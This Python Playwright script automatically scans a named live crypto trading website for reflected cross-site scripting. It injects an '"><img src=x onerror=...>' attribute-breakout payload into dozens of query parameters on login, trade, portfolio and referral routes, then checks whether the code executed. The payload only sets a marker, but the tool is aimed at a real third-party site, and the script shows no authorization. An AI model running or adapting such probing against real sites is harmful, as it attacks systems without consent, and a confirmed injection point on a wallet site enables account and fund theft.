from __future__ import annotations

import asyncio
import json
import urllib.parse
from pathlib import Path

from playwright.async_api import Browser, Page, Route, async_playwright

BASE = "https://gmgn.ai"
USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

ROUTE_PARAMS: dict[str, tuple[str, ...]] = {
    "/": ("q", "search", "ref", "invite_code", "redirect"),
    "/login": ("redirect", "returnUrl", "callback", "next", "from"),
    "/tglogin": ("redirect", "callback", "code", "state", "next"),
    "/rewards": ("invite_code", "referral_code", "code", "ref", "tab"),
    "/invite": ("invite_code", "referral_code", "code", "ref"),
    "/referral": ("invite_code", "referral_code", "code", "ref"),
    "/discover": ("q", "query", "keyword", "search", "name", "symbol"),
    "/trenches": ("q", "query", "keyword", "search", "name", "symbol"),
    "/trade": ("chain", "address", "token", "from", "to"),
    "/portfolio": ("address", "wallet", "chain", "tab"),
    "/watchlist": ("q", "query", "search", "name"),
    "/profile": ("address", "user", "name", "tab"),
    "/settings": ("tab", "redirect", "callback", "message"),
}
MAX_CASES = 64
NAV_TIMEOUT_MS = 16_000
SETTLE_MS = 1_100
OUT = Path("gmgn_public_dom_probe.json")


def build_cases() -> list[dict[str, str]]:
    cases: list[dict[str, str]] = []
    index = 0
    for route, params in ROUTE_PARAMS.items():
        for param in params:
            if len(cases) >= MAX_CASES:
                return cases
            index += 1
            marker = f"GMGNHTML{index}"
            payload = (
                f'''"><img src=x onerror="parent.document.documentElement.setAttribute('data-gmgn-xss','{marker}')">'''
            )
            query = urllib.parse.urlencode({param: payload})
            cases.append(
                {
                    "kind": "html-attribute",
                    "route": route,
                    "param": param,
                    "marker": marker,
                    "url": f"{BASE}{route}?{query}",
                }
            )
    return cases


def report_for(cases: list[dict[str, str]], results: list[dict]) -> dict:
    executed = [result for result in results if result["executed"]]
    reflected = [result for result in results if result["reflected"]]
    return {
        "scope": "unauthenticated public GET navigation with harmless in-page marker only",
        "summary": {
            "cases_planned": len(cases),
            "cases_run": len(results),
            "executed": len(executed),
            "reflected_without_execution": len([r for r in reflected if not r["executed"]]),
            "navigation_errors": sum(1 for result in results if result["error"]),
        },
        "executed_cases": executed,
        "reflected_cases": reflected,
        "results": results,
    }


async def test_case(page: Page, case: dict[str, str]) -> dict:
    result = {
        **case,
        "status": None,
        "final_url": None,
        "executed": False,
        "reflected": False,
        "dialogs": [],
        "error": None,
    }

    async def on_dialog(dialog) -> None:
        result["dialogs"].append(dialog.message)
        try:
            await dialog.dismiss()
        except Exception:
            pass

    page.on("dialog", on_dialog)
    try:
        response = await page.goto(
            case["url"],
            wait_until="domcontentloaded",
            timeout=NAV_TIMEOUT_MS,
        )
        result["status"] = response.status if response else None
        result["final_url"] = page.url
        await page.wait_for_timeout(SETTLE_MS)
        state = await page.evaluate(
            """marker => ({
                attr: document.documentElement.getAttribute('data-gmgn-xss'),
                htmlHasMarker: document.documentElement.outerHTML.includes(marker),
                imgMarkers: Array.from(document.querySelectorAll('img')).filter(img =>
                    (img.getAttribute('onerror') || '').includes(marker) ||
                    (img.outerHTML || '').includes(marker)
                ).length,
            })""",
            case["marker"],
        )
        result["executed"] = state.get("attr") == case["marker"]
        result["reflected"] = bool(state.get("htmlHasMarker") or state.get("imgMarkers"))
        result["dom_state"] = state
    except Exception as exc:  # noqa: BLE001
        result["error"] = f"{type(exc).__name__}: {exc}"
        try:
            result["final_url"] = page.url
        except Exception:
            pass
    finally:
        try:
            page.remove_listener("dialog", on_dialog)
        except Exception:
            pass
    return result


async def run() -> dict:
    cases = build_cases()
    results: list[dict] = []
    async with async_playwright() as playwright:
        browser: Browser = await playwright.chromium.launch(
            headless=True,
            args=["--disable-dev-shm-usage", "--no-sandbox"],
        )
        context = await browser.new_context(
            user_agent=USER_AGENT,
            ignore_https_errors=True,
            viewport={"width": 1280, "height": 900},
        )
        page = await context.new_page()

        async def route_handler(route: Route) -> None:
            try:
                if route.request.resource_type in {"font", "media"}:
                    await route.abort()
                else:
                    await route.continue_()
            except Exception:
                pass

        await page.route("**/*", route_handler)

        for case in cases:
            result = await test_case(page, case)
            results.append(result)
            OUT.write_text(
                json.dumps(report_for(cases, results), indent=2, ensure_ascii=False),
                encoding="utf-8",
            )
            print(
                "CASE",
                json.dumps(
                    {
                        "route": result["route"],
                        "param": result["param"],
                        "status": result["status"],
                        "executed": result["executed"],
                        "reflected": result["reflected"],
                        "error": result["error"],
                    },
                    sort_keys=True,
                ),
                flush=True,
            )
            if result["executed"]:
                break
            try:
                await page.evaluate(
                    "document.documentElement.removeAttribute('data-gmgn-xss')"
                )
                await page.wait_for_timeout(100)
            except Exception:
                try:
                    await page.close()
                except Exception:
                    pass
                page = await context.new_page()
                await page.route("**/*", route_handler)

        try:
            await context.close()
        finally:
            await browser.close()

    return report_for(cases, results)


def main() -> int:
    report = asyncio.run(run())
    OUT.write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")
    print(json.dumps(report["summary"], indent=2))
    print(f"WROTE {OUT} ({OUT.stat().st_size} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
